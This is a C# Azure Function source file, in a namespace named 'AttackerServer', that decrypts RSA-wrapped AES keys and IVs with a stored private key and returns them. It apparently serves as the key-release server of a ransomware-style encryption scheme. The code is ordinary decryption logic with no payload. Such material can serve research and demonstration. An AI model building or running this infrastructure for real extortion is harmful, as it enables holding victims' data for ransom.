using System.Linq;
using System.Net;
using System.Net.Http;
using Microsoft.Azure.WebJobs;
using Microsoft.Azure.WebJobs.Extensions.Http;
using Microsoft.Azure.WebJobs.Host;

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;
using Newtonsoft.Json;
using System.Threading.Tasks;

namespace AttackerServer
{
    public static class GetKey
    {
        [FunctionName("GetKey")]
        public static async Task<HttpResponseMessage> Run(
            [HttpTrigger(AuthorizationLevel.Function, "get", "post", Route = null)]HttpRequestMessage req,
            [Blob("mykeys/private_key.pem", FileAccess.Read, Connection = "AzureWebJobsStorage")] string privateKey,
            TraceWriter log)
        {
            log.Info("C# HTTP trigger function processed a request.");
           
            var jsonContent = await req.Content.ReadAsStringAsync();
            var input = JsonConvert.DeserializeObject<Dictionary<string, string>>(jsonContent);
            var provider = PemKeyUtils.GetRSAProviderFromPemFile(privateKey.Trim());
            byte[] encKey = Convert.FromBase64String(input["key"]); 
            byte[] encIV = Convert.FromBase64String(input["iv"]); 
            byte[] key = provider.Decrypt(encKey, false);
            byte[] iv = provider.Decrypt(encIV, false);

            log.Info("done decrypting");
            var values = new Dictionary<string, string>
            {
               { "key",  Convert.ToBase64String(key)},
               { "iv",   Convert.ToBase64String(iv)}
            };

            var dict = JsonConvert.SerializeObject(values);
            log.Info("done json");
            return req.CreateResponse(HttpStatusCode.OK, dict);
        }

        static public byte[] RSADecrypt(byte[] DataToDecrypt, RSAParameters RSAKeyInfo, bool DoOAEPPadding, TraceWriter log)
        {
            try
            {
                byte[] decryptedData;
                //Create a new instance of RSACryptoServiceProvider.
                using (RSACryptoServiceProvider RSA = new RSACryptoServiceProvider())
                {
                    //Import the RSA Key information. This needs
                    //to include the private key information.
                    RSA.ImportParameters(RSAKeyInfo);

                    //Decrypt the passed byte array and specify OAEP padding.  
                    //OAEP padding is only available on Microsoft Windows XP or
                    //later.  
                    decryptedData = RSA.Decrypt(DataToDecrypt, DoOAEPPadding);
                }
                return decryptedData;
            }
            //Catch and display a CryptographicException  
            //to the console.
            catch (CryptographicException e)
            {
                Console.WriteLine(e.ToString());
                log.Info("Decryption failed ! ");
                return null;
            }

        }
    }
}
